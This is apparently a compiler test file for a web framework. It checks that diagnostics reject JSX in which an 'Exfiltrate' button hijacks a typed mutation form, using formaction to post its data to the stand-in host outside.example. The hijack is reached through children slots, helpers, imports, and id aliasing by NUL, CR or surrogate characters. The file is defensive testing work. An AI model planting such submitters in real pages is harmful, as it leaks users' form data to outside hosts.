import { describe, expect, it } from 'vitest';

import { compileComponentModule } from './index.js';

interface ExtraFile {
  readonly fileName: string;
  readonly source: string;
}

function compile(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compileComponentModule({
    extraFiles,
    fileName: 'src/browser-final-rereview.tsx',
    source,
  } as Parameters<typeof compileComponentModule>[0] & {
    extraFiles: readonly ExtraFile[];
  });
}

function kv242(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compile(source, extraFiles).diagnostics.filter(
    (diagnostic) => diagnostic.code === 'KV242',
  );
}

function kv236(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compile(source, extraFiles).diagnostics.filter(
    (diagnostic) => diagnostic.code === 'KV236',
  );
}

const optionalMutation = `
export const save = mutation({
  input: s.object({ email: s.string().optional() }),
  handler() { return null; },
});
`;

describe('browser/compiler final rereview: indirect mutation-form output', () => {
  it('rejects a submitter projected through a typed form component children slot', () => {
    // SPEC §§5.2, 6.3, and 9.1: component composition cannot move a submitter override into a
    // compiler-owned mutation form after the transport proof has classified it as a sibling.
    expect(
      kv242(`
${optionalMutation}
function MutationShell({ children }) {
  return <form id="account-save" mutation={save}>{children}</form>;
}
export const View = component({
  render: () => (
    <MutationShell>
      <button external formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>
    </MutationShell>
  ),
});
`),
    ).not.toEqual([]);
  });

  it('rejects a helper-returned submitter interpolated directly into a typed form', () => {
    expect(
      kv242(`
${optionalMutation}
function unsafeSubmitter() {
  return <button external formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}
export const View = component({
  render: () => <form mutation={save}>{unsafeSubmitter()}</form>,
});
`),
    ).not.toEqual([]);
  });

  it('rejects an imported helper-returned submitter interpolated into a typed form', () => {
    expect(
      kv242(
        `
import { unsafeSubmitter } from './unsafe-submitter';
${optionalMutation}
export const View = component({
  render: () => <form mutation={save}>{unsafeSubmitter()}</form>,
});
`,
        [
          {
            fileName: 'src/unsafe-submitter.tsx',
            source: `export function unsafeSubmitter() {
  return <button external formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}`,
          },
        ],
      ),
    ).not.toEqual([]);
  });

  it('rejects cross-component form association assembled by a route page root', () => {
    // Route page callbacks are document-render roots too; limiting the census to component(...)
    // declarations leaves a route-only assembly unit unable to relate its imported siblings.
    expect(
      kv242(
        `
import { route } from '@kovojs/server';
import { TypedForm } from './typed-form';
import { ExternalSubmitter } from './external-submitter';
export const account = route('/account', {
  page: () => <><TypedForm /><ExternalSubmitter /></>,
});
`,
        [
          {
            fileName: 'src/typed-form.tsx',
            source: `${optionalMutation}
export function TypedForm() {
  return <form id="account-save" mutation={save}><button>Save</button></form>;
}`,
          },
          {
            fileName: 'src/external-submitter.tsx',
            source: `export function ExternalSubmitter() {
  return <button external form="account-save" formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}`,
          },
        ],
      ),
    ).not.toEqual([]);
  });

  it.each([
    ['NUL replacement', 'account\u0000save', 'account\ufffdsave'],
    ['CR preprocessing', 'account\rsave', 'account\nsave'],
    ['CRLF preprocessing', 'account\r\nsave', 'account\nsave'],
    ['lone surrogate UTF-8 replacement', 'account\ud800save', 'account\ufffdsave'],
  ])('rejects source-distinct form ids that alias after %s', (_label, authoredId, wireId) => {
    // SPEC §§5.2, 6.3, and 9.1: form ownership is proved over browser-observed wire identity, not
    // source UTF-16. HTML preprocessing and UTF-8 encoding must not collapse two proven owners.
    expect(
      kv242(`
${optionalMutation}
export const View = component({
  render: () => <>
    <form id={${JSON.stringify(authoredId)}} mutation={save}><button>Save</button></form>
    <form external id={${JSON.stringify(wireId)}} action="https://preview.example/form" method="get" />
    <button external form={${JSON.stringify(wireId)}} formaction="https://outside.example/collect" formmethod="post">
      Exfiltrate
    </button>
  </>,
});
`),
    ).not.toEqual([]);
  });

  it('rejects a form reference whose HTML-preprocessed identity targets a typed form', () => {
    expect(
      kv242(`
${optionalMutation}
export const View = component({
  render: () => <>
    <form id={"account\\nsave"} mutation={save}><button>Save</button></form>
    <form external id="preview" action="/preview" method="get" />
    <button external form={"account\\rsave"} formaction="https://outside.example/collect" formmethod="post">
      Exfiltrate
    </button>
  </>,
});
`),
    ).not.toEqual([]);
  });

  it.each([
    ['literal LF', 'account\nsave'],
    ['valid surrogate pair', 'account\ud83d\ude00save'],
  ])('keeps a wire-stable %s form identity provably separate', (_label, previewId) => {
    expect(
      kv242(`
${optionalMutation}
export const View = component({
  render: () => <>
    <form mutation={save}><button>Save</button></form>
    <form external id={${JSON.stringify(previewId)}} action="/preview" method="get" />
    <button external form={${JSON.stringify(previewId)}} formaction="/preview/compact" formmethod="get">
      Preview
    </button>
  </>,
});
`),
    ).toEqual([]);
  });

  it('rejects opaque JSX-valued output wrapped in an otherwise closed fragment', () => {
    expect(
      kv242(`
${optionalMutation}
function Project({ value }) { return <>{value}</>; }
function unsafeSubmitter() {
  return <button external form="account-save" formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}
export const View = component({
  render: () => <>
    <form id="account-save" mutation={save}><button>Save</button></form>
    <Project value={unsafeSubmitter()} />
  </>,
});
`),
    ).not.toEqual([]);
  });

  it('rejects runtime-multipliable fields whose source has only one JSX control node', () => {
    expect(
      kv242(`
export const save = mutation({
  input: s.object({ email: s.string() }),
  handler() { return null; },
});
export const View = component({
  render: ({ emails }) => (
    <form mutation={save}>
      {emails.map((email) => <input name="email" value={email} />)}
    </form>
  ),
});
`),
    ).not.toEqual([]);
  });

  it('keeps a literal child in a statically separate native form valid', () => {
    expect(
      kv242(`
${optionalMutation}
function NativeShell({ children }) {
  return <form id="preview" action="/preview" method="get">{children}</form>;
}
export const View = component({
  render: () => <>
    <form mutation={save}><button>Save</button></form>
    <NativeShell><button formaction="/preview/compact" formmethod="get">Preview</button></NativeShell>
  </>,
});
`),
    ).toEqual([]);
  });
});

describe('server HTML identity diagnostics', () => {
  it.each([
    ['form id NUL', '<form id={"record\\u00001"} />'],
    ['form reference CR', '<button form={"record\\r1"}>Save</button>'],
    ['submitted name LF', '<input name={"record\\nId"} />'],
    ['input value LF', '<input type="hidden" name="recordId" value={"record\\n1"} />'],
    ['button value CRLF', '<button name="intent" value={"save\\r\\nother"}>Save</button>'],
    ['option value surrogate', '<option value={"record\\ud8001"}>Record</option>'],
    ['textarea initial NUL', '<textarea name="notes">{"first\\u0000second"}</textarea>'],
    [
      'option fallback collapse',
      '<select name="record"><option>{" record  one "}</option></select>',
    ],
    ['authored key NUL', '<section key={"record\\u00001"}>Record</section>'],
  ])('rejects compiler-known %s before server render', (_label, element) => {
    const diagnostics = kv236(`
export const View = component({
  render: () => ${element},
});
`);
    expect(diagnostics).not.toEqual([]);
    expect(diagnostics[0]?.message).toContain('browser would observe a different string');
    expect(diagnostics[0]?.help).toContain('SPEC §13.2');
  });

  it('checks static intrinsic spread values through the same wire predicate', () => {
    expect(
      kv236(`
export const View = component({
  render: () => <input {...{ name: "record\\nId", value: "record\\ud8001" }} />,
});
`),
    ).toHaveLength(2);
  });

  it('accepts wire-stable DOM and submitted identities', () => {
    expect(
      kv236(`
export const View = component({
  render: () => <>
    <form id={"record\\n1"} />
    <input type="hidden" name="recordId" value={"record\\ud83d\\ude001"} />
    <textarea name="notes">{"first\\r\\nsecond"}</textarea>
    <select name="record"><option value="record-1">United  States</option></select>
    <p title={"ordinary\\nmultiline display"}>Copy</p>
  </>,
});
`),
    ).toEqual([]);
  });
});
